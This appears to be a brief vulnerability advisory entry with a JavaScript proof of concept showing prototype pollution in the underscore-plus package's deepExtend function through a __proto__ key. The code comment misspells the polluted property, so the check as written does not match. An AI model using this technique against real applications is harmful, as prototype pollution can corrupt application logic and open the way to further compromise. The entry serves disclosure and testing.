# underscore-plus

- package name: `underscore-plus`

- PoC exploit:

```javascript
var up = require('underscore-plus');

up.deepExtend({}, {['__proto__']: {polluted: 'yes'}})
// Object.prototype.poluted === 'yes'
```